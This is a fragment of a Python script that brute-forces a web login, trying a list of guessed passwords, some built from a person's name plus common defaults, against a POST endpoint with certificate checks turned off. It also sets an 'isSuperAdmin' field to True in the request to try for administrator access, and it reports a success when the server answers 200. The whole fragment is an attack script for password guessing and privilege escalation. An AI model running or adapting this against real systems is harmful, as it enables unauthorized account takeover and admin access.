...
passwords = ["Aravind@123", "Aravind@1234", "Gnd@123", "Gnd@1234", "Admin@123", "password", "12345678"]
...
for pwd in passwords:
    ...
    try:
        ...
        if r.status_code == 200:
            ...
            print(f"Failed '{pwd}' with isSuperAdmin=False: {r.status_code}")
            
        # Try with isSuperAdmin: True just in case
        json_data["isSuperAdmin"] = True
        r = requests.post(url, json=json_data, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"SUCCESS with isSuperAdmin=True! Password: '{pwd}'")
            found = True
            break
